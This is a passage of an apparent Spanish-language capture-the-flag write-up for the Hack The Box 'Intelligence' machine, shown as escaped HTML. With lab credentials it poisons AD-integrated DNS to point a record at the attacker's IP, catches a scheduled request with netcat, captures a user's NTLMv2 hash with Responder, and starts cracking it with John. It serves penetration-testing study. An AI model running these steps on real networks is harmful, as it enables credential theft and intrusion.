            &lt;span class=&#34;nb&#34;&gt;Send-MailMessage&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-From&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Ted Graves &amp;lt;Ted.Graves@intelligence.htb&amp;gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-To&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Ted Graves &amp;lt;Ted.Graves@intelligence.htb&amp;gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Subject&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Host: &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;$(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$record&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; is down&amp;#34;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;La informacion del script nos llevo a &lt;a href=&#34;https://www.thehacker.recipes/active-directory-domain-services/movement/mitm-and-coerced-authentications/adidns-spoofing&#34;&gt;ADIDNS Poisoning&lt;/a&gt;, &lt;a href=&#34;https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/&#34;&gt;&amp;ldquo;Relaying&amp;rdquo; Kerberos&lt;/a&gt; y &lt;a href=&#34;http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html&#34;&gt;Delegate Your Way&lt;/a&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In order to function properly, Active Directory services need DNS. In that matter, Active Directory Domain Services (AD-DS) offer an integrated storage and replication service for DNS records. This is called Active Directory Integrated DNS (ADIDNS).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;dns-record&#34;&gt;DNS Record&lt;/h2&gt;
&lt;p&gt;Se menciona en &lt;a href=&#34;https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing#theory&#34;&gt;ADIDNS poisoning&lt;/a&gt; que los usuarios &amp;ldquo;regulares&amp;rdquo; pueden crear objetos.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Since ADIDNS zone DACL (Discretionary Access Control List) enables regular users to create child objects by default, attackers can leverage that and hijack traffic.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;dnstool&#34;&gt;DNSTool&lt;/h4&gt;
&lt;p&gt;Basado en eso utilizamos dnstool del toolkit de &lt;a href=&#34;https://github.com/dirkjanm/krbrelayx#krbrelayx---unconstrained-delegation-abuse-toolkit&#34;&gt;krbrelayx&lt;/a&gt;, esto con el objetivo de agregar un registro DNS. Iniciamos creando un entorno virtual con &lt;code&gt;virtualenv&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;virtualenv krbrelayx
&lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt; krbrelayx/bin/activate
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Realizamos un query a un &amp;ldquo;subdominio&amp;rdquo; que conocemos, el cual nos devolvio que existe y la direccion IP del registro.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;krbrelayx&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  π krbrelayx master ✗ ❯ python3 dnstool.py -u intelligence&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;Tiffany.Molina -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;NewIntelligenceCorpUser9876&amp;#39;&lt;/span&gt; --record &lt;span class=&#34;s1&#34;&gt;&amp;#39;dc.intelligence.htb&amp;#39;&lt;/span&gt; --action query 10.10.10.248
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Connecting to host...
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Binding to host
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Bind OK
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Found record dc
&lt;span class=&#34;nv&#34;&gt;DC&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;dc,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;intelligence.htb,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;MicrosoftDNS,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;DomainDnsZones,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;intelligence,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Record entry:
 - Type: &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Unsupported&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Serial: 74&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;DC&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;dc,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;intelligence.htb,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;MicrosoftDNS,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;DomainDnsZones,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;intelligence,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Record entry:
 - Type: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;A&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Serial: 74&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 - Address: 10.10.10.248
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;krbrelayx&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  π krbrelayx master ✗ ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Como sabemos existe un script que realiza una solicitud hacia direcciones que contengan &lt;code&gt;web*&lt;/code&gt;, agregamos un registro con esta palabra.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;krbrelayx&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  π krbrelayx master ✗ ❯ python3 dnstool.py -u intelligence&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;Tiffany.Molina -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;NewIntelligenceCorpUser9876&amp;#39;&lt;/span&gt; --record &lt;span class=&#34;s1&#34;&gt;&amp;#39;webx.intelligence.htb&amp;#39;&lt;/span&gt; --action add --data 10.10.14.24 10.10.10.248
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Connecting to host...
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Binding to host
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Bind OK
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Adding new record
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; LDAP operation completed successfully
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;krbrelayx&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  π krbrelayx master ✗ ❯ python3 dnstool.py -u intelligence&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;Tiffany.Molina -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;NewIntelligenceCorpUser9876&amp;#39;&lt;/span&gt; --record &lt;span class=&#34;s1&#34;&gt;&amp;#39;webx.intelligence.htb&amp;#39;&lt;/span&gt; --action query 10.10.10.248
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Connecting to host...
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Binding to host
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Bind OK
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Found record webx
&lt;span class=&#34;nv&#34;&gt;DC&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;webx,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;intelligence.htb,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;MicrosoftDNS,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;DomainDnsZones,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;intelligence,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Record entry:
 - Type: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;A&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Serial: 75&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 - Address: 10.10.14.24
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Confirmamos con &lt;code&gt;dig&lt;/code&gt; que dicha direccion fue registrada a nuestra direccion IP.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;krbrelayx&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  π krbrelayx master ✗ ❯ dig webx.intelligence.htb @10.10.10.248

&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.16.15-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; webx.intelligence.htb @10.10.10.248
&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt; global options: +cmd
&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt; Got answer:
&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt; -&amp;gt;&amp;gt;HEADER&lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt;- opco&lt;/span&gt;de: QUERY, status: NOERROR, id: &lt;span class=&#34;m&#34;&gt;29036&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt; flags: qr aa rd ra&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;

&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt; OPT PSEUDOSECTION:
&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; EDNS: version: 0, flags:&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; udp: &lt;span class=&#34;m&#34;&gt;4000&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt; QUESTION SECTION:
&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;webx.intelligence.htb.     IN  A

&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt; ANSWER SECTION:
webx.intelligence.htb.  &lt;span class=&#34;m&#34;&gt;180&lt;/span&gt; IN  A   10.10.14.24

&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt; Query time: &lt;span class=&#34;m&#34;&gt;76&lt;/span&gt; msec
&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt; SERVER: 10.10.10.248#53&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.248&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt; WHEN: Sun Jul &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 02:47:20 EDT &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt; MSG SIZE  rcvd: &lt;span class=&#34;m&#34;&gt;66&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;krbrelayx&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  π krbrelayx master ✗ ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Escuchamos con netcat el puerto 80 y obtuvimos una solicitud por parte de la maquina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ldapdomaindump&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  π ldapdomaindump master ✗ ❯ sudo nc -lvp &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
listening on &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;any&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt; ...
connect to &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.14.24&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; from intelligence.htb &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.10.248&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;61096&lt;/span&gt;
GET / HTTP/1.1
User-Agent: Mozilla/5.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Windows NT&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Windows NT 10.0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; en-US&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; WindowsPowerShell/5.1.17763.1852
Host: webx
Connection: Keep-Alive
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;responder&#34;&gt;Responder&lt;/h4&gt;
&lt;p&gt;Con ello confirmamos que realiza la solicitud a cada 5 minutos, utilizamos &lt;code&gt;responder&lt;/code&gt; donde obtuvimos el hash de &lt;strong&gt;Ted.Graves&lt;/strong&gt;, ya que el script utiliza las credenciales del usuario.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Generic Options:
    Responder NIC              &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;tun0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
    Responder IP               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.14.24&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
    Challenge &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;              &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;random&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
    Don&lt;span class=&#34;s1&#34;&gt;&amp;#39;t Respond To Names     [&amp;#39;&lt;/span&gt;ISATAP&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Current Session Variables:
    Responder Machine Name     &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;WIN-B3PL3QLKQOU&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
    Responder Domain Name      &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;YFNL.LOCAL&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
    Responder DCE-RPC Port     &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;48424&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Listening &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; events...

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HTTP&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Sending NTLM authentication request to 10.10.10.248
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HTTP&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; GET request from: 10.10.10.248     URL: /
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HTTP&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Host             : webx
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HTTP&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; NTLMv2 Client   : 10.10.10.248
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HTTP&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; NTLMv2 Username : intelligence&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;ed.Graves
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HTTP&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; NTLMv2 Hash     : Ted.Graves::intelligence:aae02c86a392025c:BDB7208972780C8A4CC1E9ABFEB732F7:0101000000000000701069866076D701DE61F30888CEE4A40000000002000800590046004E004C0001001E00570049004E002D004200330050004C00330051004C004B0051004F00550004001400590046004E004C002E004C004F00430041004C0003003400570049004E002D004200330050004C00330051004C004B0051004F0055002E00590046004E004C002E004C004F00430041004C0005001400590046004E004C002E004C004F00430041004C00080030003000000000000000000000000020000024C537F3A4AFF46737ABD3E6A78F3F281EDA563CF71819110E512CE0047058B90A001000000000000000000000000000000000000900340048005400540050002F0077006500620078002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;john---crack-the-hash&#34;&gt;John - Crack The Hash&lt;/h4&gt;
&lt;p&gt;Crackeamos la contraseña de Ted utilizando John con el wordlist rockyou.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/intelligence ❯ cat hash_ted.txt
